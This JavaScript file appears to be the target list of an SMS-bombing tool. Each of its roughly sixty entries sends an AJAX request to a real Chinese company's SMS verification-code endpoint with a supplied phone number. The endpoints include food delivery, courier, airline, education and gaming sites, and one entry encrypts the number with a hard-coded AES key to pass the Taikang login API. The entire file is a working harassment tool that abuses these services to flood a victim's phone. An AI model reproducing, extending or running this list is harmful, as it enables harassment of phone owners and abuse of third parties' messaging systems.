/**
 * 网站短信接口
 * 更新：2022-11-9
 * @type {*[]}
 */
var requestList = [
    {
        name: '工图网',
        fn: function (phone) {
            $.ajax({
                url: "https://www.900ppt.com/api/login/getSmsCode",
                data: {
                    phone: phone,
                    easy: 1
                },
                type: "GET",
                dataType: "json",
            });
        }
    },
    {
        name: '李宁',
        fn: function (phone) {
            $.ajax({
                url: "https://hapi.00bang.cn/llb/oauth/llb/getLoginSmsCode",
                data: {
                    mobile: phone,
                    //easy: 1
                },
                type: "GET",
                dataType: "json",
            });
        }
    },
    {
        name: '太平洋',
        fn: function (phone) {
            $.ajax({
                url: "https://qdfront.pcauto.com.cn/interface/order/send_msg_code.xsp?callback=jsonp1644936876550",
                data: {
                phone: phone,
                    //easy: 1
                },
                type: "GET",
                dataType: "json",
            });
        }
    },
    {
        name: '沪江',
        fn: function (phone) {
            $.ajax({
                url: "https://pass.hujiang.com/intraApi/v1/sms/send",
                data: {
                    mobile: phone,
                    //easy: 1
                },
                type: "GET",
                dataType: "json",
            });
        }
    },
    {
        name: '饿了么',
        fn: function (phone) {
            $.ajax({
                url: "https://knight.ele.me/knight/register/send-captcha",
                data: {
                    mobile: phone,
                    //easy: 1
                },
                type: "GET",
                dataType: "json",
            });
        }
    },
    {
        name: '星图汽车',
        fn: function (phone) {
            $.ajax({
                url: "https://www.exeedcars.com/api/exeed/dealer/getPhoneCode",
                data: {
                    phone: phone,
                    //easy: 1
                },
                type: "GET",
                dataType: "json",
            });
        }
    },
    {
        name: '唱吧',
        fn: function (phone) {
            $.ajax({
                url: "https://changba.com/official_login.php?ac=start_phone_entry&phone="+phone,
                data: {
                    //phone: phone,
                    //easy: 1
                },
                type: "GET",
                dataType: "json",
            });
        }
    },
    {
        name: '星途汽车',
        fn: function (phone) {
            $.ajax({
                url: "https://www.exeedcars.com/api/exeed/dealer/getPhoneCode",
                data: {
                    phone: phone,
                    verifyCode:0.3787513510592848
                },
                type: "GET",
                dataType: "json",
            });
        }
    },
    {
        name: '贪玩平台',
        fn: function (phone) {
            $.ajax({
                url: "https://www.tanwan.com/api/reg_json_2019.php",
                data: {
                    act:3,
                    phone: phone
                },
                type: "GET",
                dataType: "json",
            });
        }
    },
    {
        name: '芝士律动',
        fn: function (phone) {
            $.ajax({
                url: "https://api.zscaishang.com/api/v1/verify_code/login",
                data: {
                    mobile: phone
                },
                type: "GET",
                dataType: "json",
            });
        }
    },
    {
        name: '体检宝',
        fn: function (phone) {
            $.ajax({
                url: "http://www.xueyazhushou.com/api/do_gift.php",
                data: {
                    username: phone,
                    Action:'get_vcode'
                },
                type: "GET",
                dataType: "json",
            });
        }
    },
    {
        name: '系统验证',
        fn: function (phone) {
            $.ajax({
                url: "https://card.10010.com/ko-order/messageCaptcha/send",
                data: {
                    phoneVal:phone
                },
                type: "GET",
                dataType: "json",
            });
        }
    },
    {
        name: '嗨学网',
        fn: function (phone) {
            $.ajax({
                url: "http://api-passport.haixue.com/common/send-sms-code?type=LOGIN_CODE&_=1655268837034",
                data: {
                    mobile:phone
                },
                type: "GET",
                dataType: "json",
            });
        }
    },
    {
        name: '觅房',
        fn: function (phone) {
            $.ajax({
                url: "https://m.milike.com/dg/getNewSmscode.htm?",
                data: {
                    mobile:phone
                },
                type: "GET",
                dataType: "json",
            });
        }
    },
    {
        name: '饿了么',
        fn: function (phone) {
            $.ajax({
                url: "https://knight.ele.me/knight/register/send-captcha?",
                data: {
                    mobile:phone
                },
                type: "GET",
                dataType: "json",
            });
        }
    },
    {
        name: '优诺科技',
        fn: function (phone) {
            $.ajax({
                url: "https://web-server.uino.com/users/getPhoneVCode",
                data: {
                    phone:phone
                },
                type: "POST",
                dataType: "json",
            });
        }
    },
    {
        name: '顺丰速运',
        fn: function (phone) {
            $.ajax({
                url: "http://pmp-proxy.sf-express.com/pmp_int/pmp/http/agnt/sendTelMessage.ht",
                data: {
                    phone:phone
                },
                type: "POST",
                dataType: "json",
            });
        }
    },
    {
        name: '瓜子二手车',
        fn: function (phone) {
            $.ajax({
                url: "https://eipis.maodou.com/account/get_verify_code",
                data: {
                    phone:phone
                },
                type: "POST",
                dataType: "json",
            });
        }
    },
    {
        name: '水滴筹',
        fn: function (phone) {
            $.ajax({
                url: "https://passport.shuidihuzhu.com/api/useraccount/sendVerifyCode",
                data: {
                    mobile:phone,
                    bizType:2
                },
                type: "POST",
                dataType: "json",
            });
        }
    },
    {
        name: '南航',
        fn: function (phone) {
            $.ajax({
                url: "https://b2c.csair.com/portal/smsMessage/ESocialMediaVerifyCode",
                data: {
                    mobile:phone
                },
                type: "POST",
                dataType: "json",
            });
        }
    },
    {
        name: 'Degas',
        fn: function (phone) {
            $.ajax({
                url: "http://120.24.220.30/rs/user/loginVcode",
                data: {
                    mobile:phone
                },
                type: "POST",
                dataType: "json",
            });
        }
    },
    {
        name: '饿了么',
        fn: function (phone) {
            $.ajax({
                url: "https://knight.ele.me/knight/register/send-captcha",
                data: {
                    mobile:phone
                },
                type: "GET",
                dataType: "json",
            });
        }
    },
    {
        name: '太平洋汽车网',
        fn: function (phone) {
            $.ajax({
                url: "https://qdfront.pcauto.com.cn/interface/order/send_msg_code.xsp?callback=jsonp1644936876550",
                data: {
                    phone:phone
                },
                type: "GET",
                dataType: "json",
            });
        }
    },
    {
        name: '周末去哪儿',
        fn: function (phone) {
            $.ajax({
                url: "https://m.wanzhoumo.com/proxy?api_path=/user/mobilelogincode&v=3.0&fields_version=3.3",
                data: {
                    mobile:phone
                },
                type: "GET",
                dataType: "json",
            });
        }
    },
    {
        name: '17k小说网',
        fn: function (phone) {
            $.ajax({
                url: "https://h5.17k.com/ck/user/mobile/"+phone+"/message?smsType=1&appKey=1351550300",
                data: {
                    // mobile:phone
                },
                type: "GET",
                dataType: "json",
            });
        }
    },
    {
        name: '唱吧',
        fn: function (phone) {
            $.ajax({
                url: "https://changba.com/official_login.php?ac=start_phone_entry",
                data: {
                     phone:phone
                },
                type: "GET",
                dataType: "json",
            });
        }
    },
    {
        name: '图怪兽',
        fn: function (phone) {
            $.ajax({
                url: "https://818ps.com/site-api/send-tel-login-code?codeImg=undefined",
                data: {
                    num:phone
                },
                type: "GET",
                dataType: "json",
            });
        }
    },
    {
        name: '企业账号',
        fn: function (phone) {
            $.ajax({
                url: "https://818ps.com/site-api/send-tel-login-code?codeImg=undefined",
                data: {
                    phone:phone
                },
                type: "GET",
                dataType: "json",
            });
        }
    },
    {
        name: '天鹅到家',
        fn: function (phone) {
            $.ajax({
                url: "http://user.daojia.com/mobile/getcode",
                data: {
                    mobile:phone
                },
                type: "GET",
                dataType: "json",
            });
        }
    },
    {
        name: '网易',
        fn: function (phone) {
            $.ajax({
                url: "https://services.qiye.163.com/service/official/sendCode?jsonpcallback=jQuery190039810459070645865_[time]",
                data: {
                    mobile:phone
                },
                type: "GET",
                dataType: "json",
            });
        }
    },
    {
        name: '格格小区',
        fn: function (phone) {
            $.ajax({
                url: "https://api.ebox.gegebox.com/v2/operator/"+phone+"/sms?captcha_code=&type=register&voice=0",
                data: {
                    //mobile:phone
                },
                type: "GET",
                dataType: "json",
            });
        }
    },
    {
        name: 'lining club',
        fn: function (phone) {
            $.ajax({
                url: "https://hapi.00bang.cn/llb/oauth/llb/getLoginSmsCode",
                data: {
                    mobile:phone
                },
                type: "GET",
                dataType: "json",
            });
        }
    },
    {
        name: '顺丰速运',
        fn: function (phone) {
            $.ajax({
                url: "http://pmp-proxy.sf-express.com/pmp_int/pmp/http/agnt/sendTelMessage.ht",
                data: {
                    phone:phone
                },
                type: "POST",
                dataType: "json",
            });
        }
    },
    {
        name: '华金',
        fn: function (phone) {
            $.ajax({
                url: "https://www.huajin.com/api/front/resource/sms/sendSms.php",
                data: {
                    mobile:phone
                },
                type: "POST",
                dataType: "json",
            });
        }
    },
    {
        name: '瓜子二手车',
        fn: function (phone) {
            $.ajax({
                url: "https://eipis.maodou.com/account/get_verify_code",
                data: {
                    phone:phone
                },
                type: "POST",
                dataType: "json",
            });
        }
    },
    {
        name: '水滴互助',
        fn: function (phone) {
            $.ajax({
                url: "https://passport.shuidihuzhu.com/api/useraccount/sendVerifyCode?type=2",
                data: {
                    mobile:phone
                },
                type: "POST",
                dataType: "json",
            });
        }
    },
    {
        name: '南航',
        fn: function (phone) {
            $.ajax({
                url: "https://b2c.csair.com/portal/smsMessage/ESocialMediaVerifyCode",
                data: {
                    mobile:phone
                },
                type: "POST",
                dataType: "json",
            });
        }
    },
    {
        name: '饿了么',
        fn: function (phone) {
            $.ajax({
                url: "https://knight.ele.me/knight/register/send-captcha",
                data: {
                    mobile:phone
                },
                type: "GET",
                dataType: "json",
            });
        }
    },
    {
        name: '讯众通讯',
        fn: function (phone) {
            $.ajax({
                url: "https://console.ytx.net/Login/SendPhoneCode",
                data: {
                    phone:phone
                },
                type: "POST",
                dataType: "json",
            });
        }
    },
    {
        name: '企业账号',
        fn: function (phone) {
            $.ajax({
                url: "https://huichuan.sm.cn/callback/ms/sma",
                data: {
                    phone:phone
                },
                type: "POST",
                dataType: "json",
            });
        }
    },
    {
        name: '美术宝一对一',
        fn: function (phone) {
            $.ajax({
                url: "https://vip.meishubao.com/ke/smscode.php",
                data: {
                    username:phone
                },
                type: "POST",
                dataType: "json",
            });
        }
    },
    {
        name: '塞优',
        fn: function (phone) {
            $.ajax({
                url: "http://www.cuour.org/api/smsCenters?type=mobile_login",
                data: {
                    mobile:phone

                },
                type: "POST",
                dataType: "json",
            });
        }
    },
    {
        name: 'ToDesk',
        fn: function (phone) {
            $.ajax({
                url: "https://wechat.todesk.com/api/phone/phonecode",
                data: {
                    phone:phone

                },
                type: "POST",
                dataType: "json",
            });
        }
    },
    {
        name: '奕奕互娱',
        fn: function (phone) {
            $.ajax({
                url: "https://olpassport.5211game.com/ValiApi/ValiCode_MobileRegister",
                data: {
                    mobile:phone
                },
                type: "POST",
                dataType: "json",
            });
        }
    },
    {
        name: '法律服务平台',
        fn: function (phone) {
            $.ajax({
                url: "https://apilr.ilvdo.com/api/v3/Personal/PersonalInfo/SendVerificationCode",
                data: {
                    iphone:phone
                },
                type: "POST",
                dataType: "json",
            });
        }
    },
    {
        name: '古德堡教育平台',
        fn: function (phone) {
            $.ajax({
                url: "https://ptcapi.kidcastle.com.cn/Base/getAuthcode",
                data: {
                    mobile:phone
                },
                type: "POST",
                dataType: "json",
            });
        }
    },
    {
        name: '微妙',
        fn: function (phone) {
            $.ajax({
                url: "https://info.weimiaoshangxueyuan.top/api/throw/common/code",
                data: {
                    phone:phone
                },
                type: "POST",
                dataType: "json",
            });
        }
    },
    {
        name: '灵镜',
        fn: function (phone) {
            $.ajax({
                url: "https://lingjingyihao.com/api/app/app/SMS/"+phone,
                data: {
                    // phone:phone
                },
                type: "GET",
                dataType: "json",
            });
        }
    },
    {
        name: '夸克',
        fn: function (phone) {
            $.ajax({
                url: "https://info.weimiaoshangxueyuan.top/api/throw/common/code?type=1",
                data: {
                    phone:phone
                },
                type: "POST",
                dataType: "json",
            });
        }
    },
    {
        name: '芝士',
        fn: function (phone) {
            $.ajax({
                url: "https://api.zscaishang.com/api/v1/verify_code/login",
                data: {
                    mobile:phone
                },
                type: "POST",
                dataType: "json",
            });
        }
    },
    {
        name: '体检宝',
        fn: function (phone) {
            $.ajax({
                url: "http://www.xueyazhushou.com/api/do_gift.php?Action=get_vcode&app=0&platform=android&systemVer=5.1.1&version=5.7.3&app_ver=5.7.3&imei=12:34:56:2f:c8:d4&device_id=12:34:56",
                data: {
                username:phone
                },
                type: "GET",
                dataType: "json",
            });
        }
    },
    {
        name: '周末去哪儿',
        fn: function (phone) {
            $.ajax({
                url: "https://m.wanzhoumo.com/proxy?api_path=/user/mobilelogincode&v=3.0&fields_version=3.3",
                data: {
                    mobile:phone
                },
                type: "GET",
                dataType: "json",
            });
        }
    },
    {
        name: '周末去哪儿',
        fn: function (phone) {
            $.ajax({
                url: "https://b2c.csair.com/portal/smsMessage/ESocialMediaVerifyCode",
                data: {
                    mobile:phone
                },
                type: "POST",
                dataType: "json",
            });
        }
    },
    {
        name: '图怪兽',
        fn: function (phone) {
            $.ajax({
                type: 'GET',
                url: 'https://818ps.com/site-api/send-tel-login-code?num=' + phone,
                dataType: 'json',
                async: false,
            });
        }
    },
    {
        name: '图怪兽',
        fn: function (phone) {
            $.ajax({
                type: 'GET',
                url: 'https://818ps.com/site-api/send-tel-login-code?num=' + phone,
                dataType: 'json',
                async: false,
            });
        }
    },
    {
        name: '图怪兽',
        fn: function (phone) {
            $.ajax({
                type: 'GET',
                url: 'https://818ps.com/site-api/send-tel-login-code?num=' + phone,
                dataType: 'json',
                async: false,
            });
        }
    },
    {
        name: '图怪兽',
        fn: function (phone) {
            $.ajax({
                type: 'GET',
                url: 'https://818ps.com/site-api/send-tel-login-code?num=' + phone,
                dataType: 'json',
                async: false,
            });
        }
    },
    {
        name: '泰康在线',
        fn: function (phone) {
            function encrypt(data) {
                var key = CryptoJS.enc.Utf8.parse("AE74AF98D6BF55BF");
                var srcs = CryptoJS.enc.Utf8.parse(data);
                var encrypted = CryptoJS.AES.encrypt(srcs, key, {
                    mode: CryptoJS.mode.ECB,
                    padding: CryptoJS.pad.Pkcs7
                });
                return encrypted + "";
            }

            phone = encodeURIComponent(encrypt(phone))
            $.ajax({
                'url': 'https://ecs.tk.cn/eservice/member/login',
                'type': 'post',
                'data': 'syn=Y&functioncode=getmark&mobile=' + phone,
                'dataType': 'json',
            });
        }
    },
]
